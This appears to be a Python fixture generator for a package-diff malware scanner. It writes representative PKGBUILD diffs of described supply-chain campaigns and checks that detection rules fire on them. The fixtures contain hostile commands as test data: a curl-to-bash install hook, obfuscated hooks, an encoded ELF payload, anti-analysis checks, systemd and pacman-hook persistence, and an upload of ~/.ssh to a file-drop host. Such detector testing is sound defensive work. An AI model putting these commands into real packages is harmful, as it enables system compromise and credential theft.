"""Generate the campaign recall fixtures (plan §10).

The §10 recall lines name three attack corpora - the June W1/W2 install-hook
campaign, its June W3 obfuscated re-release, and the July delivery stack -
plus the synthetic payload paths.  The real diffs are not redistributable, so
each fixture here is a *representative* rebuild of one delivery step, written
from the published description of the campaign: same mechanism, invented
names and hosts.  ``fidelity`` records that.

Unlike ``gen_malicious_fixtures.py`` this script owns exactly one directory
and never deletes a file it did not write, so the hand-reconciled labels in
``synthetic/`` (plan §15.3) cannot be clobbered by running it.

Usage:
    python scripts/gen_campaign_fixtures.py [--out tests/fixtures/malicious/campaign]

Exit code is 1 when a fixture does not detect what it is labelled for, so a
rule that stops detecting fails here before it fails in the gates.
"""

import argparse
import base64
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from calibration_gates import shipped_config
from trustsight.analysis import scan_diff
from trustsight.config import load_config
from trustsight.rules import load_rules

FIXTURES: list[dict] = []

_ELF_BLOB = base64.b64encode(b"\x7fELF\x02\x01\x01" + b"\x00" * 120).decode()


def add(name: str, body: str, **expect) -> None:
    FIXTURES.append({"name": name, "diff_text": body, "expect": expect})


def diff(*added: str, context: str = "pkgname=demo\npkgver=1.0") -> str:
    """A one-file unified diff whose hunk adds *added*."""
    ctx = context.splitlines()
    plus = "\n".join("+" + line for line in added)
    return (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n"
        f"@@ -1,{len(ctx)} +1,{len(ctx) + len(added)} @@\n"
        + "".join(f" {line}\n" for line in ctx)
        + plus
        + "\n"
    )


# ── June W1/W2: the install hook fetches and runs foreign code ──────────────

add("june-w1-install-hook-foreign-fetch",
    diff(
        "install=demo.install",
        "post_install() {",
        "  npm install -g @demo-analytics/telemetry",
        "}",
    ),
    description="Install hook installs a package from a foreign package manager",
    campaign="june-w1-w2", fidelity="representative",
    must_fire=["R007", "R081"], min_score=25)

add("june-w2-install-hook-remote-script",
    diff(
        "install=demo.install",
        "post_install() {",
        "  curl -fsSL https://cdn.demo-analytics.example/setup.sh | bash",
        "}",
    ),
    description="Install hook pipes a remote script into a shell",
    campaign="june-w1-w2", fidelity="representative",
    must_fire=["R001", "R007"], min_score=40)

# ── June W3: the same step, spelled so a literal match misses it ────────────

add("june-w3-obfuscated-install-hook",
    diff(
        "install=demo.install",
        "post_install() {",
        r"  $'\x62\x75\x6e' add @demo-analytics/telemetry",
        "}",
    ),
    description="June W3 re-release: the package manager name is ANSI-C hex, "
                "so the rule has to match the reconstruction",
    campaign="june-w3-obfuscated", fidelity="representative",
    must_fire=["R007", "R081", "R117"], min_score=25)

add("june-w3-empty-quote-concat-hook",
    diff(
        "install=demo.install",
        "post_install() {",
        "  b''u''n add @demo-analytics/telemetry",
        "}",
    ),
    description="Same step via empty-quote concatenation",
    campaign="june-w3-obfuscated", fidelity="representative",
    must_fire=["R081", "R117"], min_score=25)

# ── July: the delivery stack ────────────────────────────────────────────────

add("july-anti-analysis-guard",
    diff(
        "build() {",
        "  if grep -q '^TracerPid:\\s*[1-9]' /proc/self/status; then exit 0; fi",
        "  if systemd-detect-virt -q; then exit 0; fi",
        "  make",
        "}",
    ),
    description="Build refuses to run under a debugger or a VM - a check with "
                "no packaging purpose",
    campaign="july", fidelity="representative",
    must_fire=["R119"], min_score=25)

add("july-reconstructed-elf-payload",
    diff(
        "build() {",
        f'  _blob="{_ELF_BLOB}"',
        '  echo "$_blob" | base64 -d > "$srcdir/helper"',
        "  make",
        "}",
    ),
    description="A base64 blob in the PKGBUILD whose bytes carry ELF magic",
    campaign="july", fidelity="representative",
    must_fire=["R120"], min_score=25)

add("july-generate-then-execute",
    diff(
        "build() {",
        "  cat > gen.sh <<'EOF'",
        "  curl -fsSL https://cdn.demo-analytics.example/stage2 -o /tmp/s2",
        "EOF",
        "  bash gen.sh",
        "  make",
        "}",
    ),
    description="Build writes a script in the same function that executes it",
    campaign="july", fidelity="representative",
    must_fire=["R121"], min_score=25)

add("july-write-then-execute",
    diff(
        "build() {",
        '  install -Dm755 "$srcdir/demo/docs/notes.txt" /tmp/.stage2',
        "  /tmp/.stage2 --install",
        "  make",
        "}",
    ),
    description="A file the recipe places is then executed from its new "
                "path - the dataflow, not the generation (R121 owns that)",
    campaign="july", fidelity="representative",
    must_fire=["R124"], min_score=25)

add("july-systemd-persistence",
    diff(
        "package() {",
        '  install -Dm644 /dev/null "$pkgdir/usr/lib/systemd/system/demo.service"',
        '  cat >> "$pkgdir/usr/lib/systemd/system/demo.service" <<EOF',
        "[Service]",
        "ExecStart=/tmp/.demo-helper",
        "EOF",
        "}",
    ),
    description="Unit whose ExecStart points at a runtime-writable path",
    campaign="july", fidelity="representative",
    must_fire=["R085"], min_score=25)

add("july-pacman-hook-persistence",
    diff(
        "package() {",
        '  install -Dm644 demo.hook "$pkgdir/usr/share/libalpm/hooks/demo.hook"',
        "}",
    ),
    description="Package installs a pacman hook - code that runs on every "
                "later transaction",
    campaign="july", fidelity="representative",
    must_fire=["R114"], min_score=5)

add("july-build-write-outside-staging",
    diff(
        "build() {",
        "  install -Dm755 helper /usr/local/bin/demo-helper",
        "  make",
        "}",
    ),
    description="A build-time write that lands outside $srcdir/$pkgdir - "
                "pacman tracks none of it",
    campaign="july", fidelity="representative",
    must_fire=["R128"], min_score=25)

add("july-exfil-to-drop-host",
    diff(
        "build() {",
        "  tar czf - \"$HOME/.ssh\" | curl -F file=@- https://0x0.st",
        "  make",
        "}",
    ),
    description="Collected data uploaded to an ephemeral file-drop host, "
                "the exfil direction no source bucket can see",
    campaign="july", fidelity="representative",
    must_fire=["R087"], must_not_fire=["R061"], min_score=25)

# ── The chain, not the step ────────────────────────────────────────────────

add("july-full-kill-chain",
    diff(
        "install=demo.install",
        "build() {",
        "  if systemd-detect-virt -q; then exit 0; fi",
        f'  _blob="{_ELF_BLOB}"',
        '  echo "$_blob" | base64 -d > "$srcdir/helper"',
        "  make",
        "}",
        "package() {",
        '  install -Dm644 demo.hook "$pkgdir/usr/share/libalpm/hooks/demo.hook"',
        "}",
        "post_install() {",
        r"  $'\x62\x75\x6e' add @demo-analytics/telemetry",
        "}",
    ),
    description="Anti-analysis, an encoded payload, persistence and an "
                "obfuscated install hook in one diff: R089's whole point",
    campaign="july", fidelity="representative",
    must_fire=["R089", "R119", "R120", "R114", "R081"], min_score=60)

# ── Controls: the must-not-fire surface §10 names ──────────────────────────

add("control-arch-check-and-generated-desktop",
    diff(
        "build() {",
        '  case "$(uname -m)" in x86_64) _arch=amd64 ;; esac',
        '  [ "$(getconf LONG_BIT)" = 64 ] || _arch=i386',
        "  cat > demo.desktop <<'EOF'",
        "[Desktop Entry]",
        "Name=Demo",
        "EOF",
        "  make",
        "}",
        "package() {",
        '  install -Dm644 demo.desktop "$pkgdir/usr/share/applications/demo.desktop"',
        "}",
    ),
    description="Architecture detection and a generated .desktop consumed by "
                "a declared install step",
    campaign="control", fidelity="representative",
    must_not_fire=["R119", "R121", "R124", "R128"], max_score=20)

add("control-bin-package-declared-source",
    diff(
        "source=(\"https://downloads.demo.example/demo-1.0-x86_64.AppImage\")",
        "sha256sums=('4d1c8b0f1b6e2a3c9f0d7e8a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c')",
        "package() {",
        '  install -Dm755 "$srcdir/demo-1.0-x86_64.AppImage" "$pkgdir/usr/bin/demo"',
        "}",
        context="pkgname=demo-appimage\npkgver=1.0",
    ),
    description="A -bin/-appimage package whose binary arrives through a "
                "declared, checksummed source.  Scores 35 under B10: the "
                "declared checksum is reported (P001) but no longer credited, "
                "so C005 and the unknown-host bucket stand on their own.  It "
                "remains a control for the delivery rules, which must stay "
                "silent; it is no longer a control for the 20-point threshold, "
                "and that is the calibration cost of not paying back points "
                "for a claim an attacker can make for free.",
    campaign="control", fidelity="representative",
    must_not_fire=["R118", "R120", "R124", "R128"], max_score=35)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--out", type=Path,
        default=Path(__file__).resolve().parent.parent
        / "tests" / "fixtures" / "malicious" / "campaign",
    )
    args = parser.parse_args()

    args.out.mkdir(parents=True, exist_ok=True)

    expected: dict[str, dict] = {}
    failures: list[str] = []

    # Labels are validated against the *shipped* config with a cold
    # database, exactly as the gates measure them (plan §15): a developer
    # box carries whatever defaults existed the day it was first run.
    with shipped_config():
        config = load_config()
        rules = load_rules()
        for fixture in FIXTURES:
            fname = fixture["name"] + ".diff"
            (args.out / fname).write_text(fixture["diff_text"])
            fact = scan_diff(fixture["diff_text"], rules=rules, config=config,
                             package_name=fixture["name"])
            fired = {e.rule_id for e in fact.score_breakdown}
            scored = {e.rule_id for e in fact.score_breakdown
                      if e.weight != 0 or e.severity == "FATAL"}

            expect = fixture["expect"]
            missed = set(expect.get("must_fire", [])) - fired
            if missed:
                failures.append(f"{fname}: {sorted(missed)} did not fire (fired: {sorted(fired)})")
            wrong = set(expect.get("must_not_fire", [])) & scored
            if wrong:
                failures.append(f"{fname}: {sorted(wrong)} scored and must not")
            if fact.final_score < expect.get("min_score", 0):
                failures.append(f"{fname}: score {fact.final_score} < {expect['min_score']}")
            if fact.final_score > expect.get("max_score", 100):
                failures.append(f"{fname}: score {fact.final_score} > {expect['max_score']}")

            entry = {k: v for k, v in expect.items() if k in
                     ("description", "campaign", "fidelity")}
            for key in ("must_fire", "must_not_fire"):
                if expect.get(key):
                    entry[key] = sorted(expect[key])
            for key in ("min_score", "max_score"):
                if key in expect:
                    entry[key] = expect[key]
            expected[fname] = entry
            print(f"  {fname}: score {fact.final_score}, fired {sorted(fired)}")

    (args.out / "expected.json").write_text(
        json.dumps(expected, indent=1, ensure_ascii=False) + "\n"
    )

    if failures:
        print(f"\nFAILURES ({len(failures)}):", file=sys.stderr)
        for failure in failures:
            print(f"  {failure}", file=sys.stderr)
        return 1
    print(f"\nAll {len(FIXTURES)} campaign fixtures detect what they claim.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
